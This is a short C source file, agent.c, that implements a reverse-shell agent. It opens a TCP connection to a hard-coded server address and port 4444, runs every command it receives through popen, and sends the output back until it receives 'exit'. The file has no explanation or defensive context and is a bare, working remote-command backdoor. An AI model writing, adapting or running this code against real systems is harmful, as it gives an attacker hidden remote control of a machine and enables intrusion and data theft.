// agent.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER_IP "127.0.0.1"
#define PORT 4444
#define BUF_SIZE 4096

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[BUF_SIZE];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    inet_pton(AF_INET, SERVER_IP, &server.sin_addr);

    connect(sock, (struct sockaddr*)&server, sizeof(server));

    while (1) {
        memset(buffer, 0, BUF_SIZE);
        int bytes = recv(sock, buffer, BUF_SIZE - 1, 0);
        if (bytes <= 0) break;

        if (strncmp(buffer, "exit", 4) == 0) break;

        FILE* fp = popen(buffer, "r");
        if (fp) {
            char result[BUF_SIZE];
            memset(result, 0, BUF_SIZE);
            fread(result, 1, BUF_SIZE - 1, fp);
            send(sock, result, strlen(result), 0);
            pclose(fp);
        } else {
            char* err = "Command execution failed\n";
            send(sock, err, strlen(err), 0);
        }
    }

    close(sock);
    return 0;
}
